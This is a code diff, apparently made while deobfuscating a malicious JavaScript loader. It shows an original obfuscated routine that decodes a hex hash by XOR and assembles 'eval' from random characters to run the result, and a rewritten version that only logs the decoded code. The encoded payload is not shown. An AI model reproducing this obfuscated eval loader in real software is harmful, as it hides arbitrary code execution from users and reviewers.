@@ -1,14 +1,14 @@
-function vjfumaorll(hash)
+function getInt(hash)// ?
 {
 	return parseInt(hash.substr(3,2),16);
 }
-function ffyshboqha(a,b){
+function ffyshboqha(a, b){//useless?
 	return a ^ b; //Bitwise XOR
 }
 function liovbrleki()
 {
 	var chars = new Array("d","e","v","a","l","^");
-	return chars[Math.floor(Math.random()*chars.length)];
+	return chars[Math.floor(Math.random() * chars.length)];
 }
 function getHash()
 {
@@ -58,19 +58,31 @@ function getHash()
 	return hash;
 }
 
-function main(ynrlyerfuv)
+function main(hash)
 {
 	var result;
 	while(true){
 		try
 		{
-			result = (new Function("mliohtsiue","var hltxbtlnyx=mliohtsiue.match(/\\S{5}/g),mndjlyeorw=\"\",orxhspxbkw=0;while(orxhspxbkw<hltxbtlnyx.length){mndjlyeorw+=Str"+"ing['fromCharCode'](vjfumaorll(hltxbtlnyx[orxhspxbkw])"+liovbrleki()+"14);orxhspxbkw++;}"+liovbrleki()+liovbrleki()+liovbrleki()+liovbrleki()+"(mndjlyeorw);")(ynrlyerfuv));
+			result = function(hash){
+				var arrHash = hash.match(/\S{5}/g),
+				code = "",
+				i = 0;
+				while(i < arrHash.length){
+					code += String.fromCharCode(getInt(arrHash[i]) ^ 14); // liovbrleki() == ^
+					i++;
+				}
+				console.log(code);
+				//eval(code); // == "+liovbrleki()+liovbrleki()+liovbrleki()+liovbrleki()+"(mndjlyeorw);"
+			}(hash);
 			break;
 		}
 		catch(er)
 		{
+			// console.log(er);
 		}
 	}
 	return result;
 }
 main(getHash());
+
